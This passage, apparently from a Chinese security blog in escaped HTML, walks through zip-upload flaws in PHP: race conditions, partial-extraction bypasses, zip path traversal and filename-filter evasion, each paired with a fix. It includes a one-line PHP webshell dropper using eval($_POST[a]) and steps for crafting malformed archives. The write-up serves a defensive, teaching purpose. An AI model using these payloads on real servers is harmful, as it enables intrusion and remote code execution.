&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;function check_dir($&lt;span class=&#34;built_in&#34;&gt;dir&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $handle = opendir($&lt;span class=&#34;built_in&#34;&gt;dir&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(($f = readdir($handle)) !== false)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!in_array($f, array(&lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;..&amp;#x27;&lt;/span&gt;)))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $ext = strtolower(substr(strrchr($f, &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;), &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!in_array($ext, array(&lt;span class=&#34;string&#34;&gt;&amp;#x27;jpg&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;gif&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;png&amp;#x27;&lt;/span&gt;)))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                unlink($&lt;span class=&#34;built_in&#34;&gt;dir&lt;/span&gt;.$f);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;修复：递归删除&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//递归删除&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;check_dir&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$dir&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$handle&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;opendir&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$dir&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;((&lt;span class=&#34;variable&#34;&gt;$f&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;readdir&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$handle&lt;/span&gt;)) !== &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;title function_ invoke__&#34;&gt;in_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$f&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;..&amp;#x27;&lt;/span&gt;)))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;is_dir&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$dir&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$f&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;title function_ invoke__&#34;&gt;check_dir&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$dir&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$f&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;strtolower&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;substr&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;strrchr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$f&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;), &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;title function_ invoke__&#34;&gt;in_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;jpg&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;gif&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;png&amp;#x27;&lt;/span&gt;)))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;title function_ invoke__&#34;&gt;unlink&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$dir&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$f&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2. 先解压再删除，条件竞争，通过上传后没有删除的短暂时间内访问该文件，在该文将上一级目录写马&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(in_array($ext, array(&lt;span class=&#34;string&#34;&gt;&amp;#x27;zip&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;jpg&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;gif&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;png&amp;#x27;&lt;/span&gt;)))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;($ext == &lt;span class=&#34;string&#34;&gt;&amp;#x27;zip&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $archive = new PclZip($file[&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ($archive-&amp;gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               exit(&lt;span class=&#34;string&#34;&gt;&amp;quot;解压失败&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        check_dir($&lt;span class=&#34;built_in&#34;&gt;dir&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        exit(&lt;span class=&#34;string&#34;&gt;&amp;#x27;上传成功!&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过 BP 一边一直上传，一边一直访问上传文件，上传的文件使用 fputs 在上级写马&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php fputs(fopen(&lt;span class=&#34;string&#34;&gt;&amp;#x27;../../../../../shell.php&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;w&amp;#x27;&lt;/span&gt;),&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;?php phpinfo();eval($_POST[a]);?&amp;gt;&amp;#x27;&lt;/span&gt;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;修复：通过上传文件夹名为随机文件名来禁止访问&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!is_dir($&lt;span class=&#34;built_in&#34;&gt;dir&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mkdir($&lt;span class=&#34;built_in&#34;&gt;dir&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$temp_dir = $&lt;span class=&#34;built_in&#34;&gt;dir&lt;/span&gt;.md5(time(). rand(&lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$temp_dir = $&lt;span class=&#34;built_in&#34;&gt;dir&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;member/1/&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!is_dir($temp_dir))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3. 通过解压失败直接退出绕过。构造可以解压一半的压缩包，把木马解压后再失败退出。目录通过右键查看图片链接获得&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ($archive-&amp;gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       exit(&lt;span class=&#34;string&#34;&gt;&amp;quot;解压失败&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;修复：退出之前递归删除&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ($archive-&amp;gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       check_dir($&lt;span class=&#34;built_in&#34;&gt;dir&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       exit(&lt;span class=&#34;string&#34;&gt;&amp;quot;解压失败&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这边详细讲一下怎么构造只能解压一部分的压缩包&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用 Windows 下的 7zip&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;修改压缩包里文件的 CRC 校验码&lt;/p&gt;
&lt;p&gt;先准备两个文件，一个 PHP 文件 1.php，一个文本文件 2.txt，其中 1.php 是 webshell。然后将这两个文件压缩成 shell.zip。 然后我们用 010editor 打开 shell.zip，可以看到右下角有这个文件的格式信息，它被分成 5 部分，如图 1。我们打开第 4 部分，其中有个 deCrc，我们随便把值改成其他的值，然后保存。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;使用 PHP 自带的 ZipArchive 库&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Windows 下不允许文件名中包含冒号（:），我们就可以在 010editor 中将 2.txt 的 deFileName 属性的值改成 “2.tx:”&lt;/p&gt;
&lt;p&gt;在 Linux 下也有类似的方法，我们可以将文件名改成 5 个斜杠（/////）&lt;/p&gt;
&lt;p&gt;4. 把压缩包中某文件名改成…/…/…/…/…/index.php，解压后文件直接到网站根目录&lt;/p&gt;
&lt;p&gt;注意修改文件名后文件名长度不变&lt;/p&gt;
&lt;p&gt;5. 通过验证文件名中不包含 &lt;code&gt;../&lt;/code&gt;  并且文件名需要为 jpg&lt;/p&gt;
&lt;p&gt;通过构造 1.php;1.jpg&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;foreach ($content &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; $t) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (strpos($t[&lt;span class=&#34;string&#34;&gt;&amp;#x27;stored_filename&amp;#x27;&lt;/span&gt;], &lt;span class=&#34;string&#34;&gt;&amp;#x27;..&amp;#x27;&lt;/span&gt;) !== FALSE ||&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                strpos($t[&lt;span class=&#34;string&#34;&gt;&amp;#x27;filename&amp;#x27;&lt;/span&gt;], &lt;span class=&#34;string&#34;&gt;&amp;#x27;..&amp;#x27;&lt;/span&gt;) !== FALSE ||&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                strpos($t[&lt;span class=&#34;string&#34;&gt;&amp;#x27;filename&amp;#x27;&lt;/span&gt;], &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;) !== FALSE ||&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                strpos($t[&lt;span class=&#34;string&#34;&gt;&amp;#x27;stored_filename&amp;#x27;&lt;/span&gt;], &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;) !== FALSE) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;                @unlink(&lt;span class=&#34;params&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                exit(function_exists(&lt;span class=&#34;string&#34;&gt;&amp;#x27;iconv&amp;#x27;&lt;/span&gt;) ? iconv(&lt;span class=&#34;string&#34;&gt;&amp;#x27;UTF-8&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;GBK&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;非法名称的文件&amp;#x27;&lt;/span&gt;) : &lt;span class=&#34;string&#34;&gt;&amp;#x27;llegal name file&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (substr(strrchr($t[&lt;span class=&#34;string&#34;&gt;&amp;#x27;stored_filename&amp;#x27;&lt;/span&gt;], &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;), &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) != &lt;span class=&#34;string&#34;&gt;&amp;#x27;jpg&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;                @unlink(&lt;span class=&#34;params&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                exit(function_exists(&lt;span class=&#34;string&#34;&gt;&amp;#x27;iconv&amp;#x27;&lt;/span&gt;) ? iconv(&lt;span class=&#34;string&#34;&gt;&amp;#x27;UTF-8&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;GBK&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件格式校验不正确&amp;#x27;&lt;/span&gt;) : &lt;span class=&#34;string&#34;&gt;&amp;#x27;The document format verification is not correct&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;6. 正确的防御方法：&lt;br&gt;
把压缩包放进 tmp 目录里，如果上传、解压缩的操作都能在 tmp 目录里完成，再把我们需要的头像文件拷贝到 web 目录中&lt;/p&gt;
&lt;p&gt;7. 附上最后一版的防御代码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span 